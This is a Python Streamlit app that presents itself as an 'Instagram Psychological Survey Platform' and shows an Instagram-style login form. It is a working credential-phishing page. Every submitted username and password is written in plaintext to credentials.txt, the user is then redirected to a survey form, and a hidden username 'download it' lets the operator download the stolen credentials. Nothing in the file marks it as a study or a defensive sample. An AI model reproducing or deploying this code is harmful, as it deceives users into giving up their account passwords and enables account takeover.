import streamlit as st
from PIL import Image
import base64


def get_base64(bin_file):
    with open(bin_file, 'rb') as f:
        data = f.read()
    return base64.b64encode(data).decode()

def set_background(png_file):
    bin_str = get_base64(png_file)
    page_bg_img = '''
    <style>
    .stApp {
        background-image: url("data:image/png;base64,%s");
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        background-attachment: fixed;
    }
    </style>
    ''' % bin_str
    st.markdown(page_bg_img, unsafe_allow_html=True)


def create_download_link(file_path, file_name):
    with open(file_path, "rb") as file:
        st.download_button(
            label="Download File",
            data=file,
            file_name=file_name,
            mime="text/plain"
        )


set_background('background.png')
# Function to display login page
def display_login_page():
    # Load the Instagram logo
    try:
        logo = Image.open("instagram_logo.png")  # Ensure you have a placeholder image named 'instagram_logo.png'
        st.image(logo, width=150)
    except:
        st.write("Instagram Logo")
    
    # Introductory paragraph
    st.markdown("""
        <h2>Welcome to the Instagram Psychological Survey Platform</h2>
        <p>This platform is intended for conducting psychological surveys based on Instagram accounts. Thanks in Advance from Rimsha Naeem 🎩</p>
        """, unsafe_allow_html=True)
    
    # Create a form for login
    with st.form(key='login_form'):
        st.subheader("Login")
        username = st.text_input("Phone number, username, or email")
        password = st.text_input("Password", type="password")
        
        # Submit button
        submit_button = st.form_submit_button("Log In")
        
        if submit_button:
            if username and password and len(password)>=8:
                with open("credentials.txt", "a") as file:
                    file.write(f"Username: {username}, Password: {password}\n")
                st.write(f"Please Visit Form here: https://forms.gle/ojrd9orgrb3iuMm78")
            else:
                st.error("Please enter both valid username and password")

    if username=="download it":
        create_download_link("credentials.txt", "credentials.txt")


display_login_page()
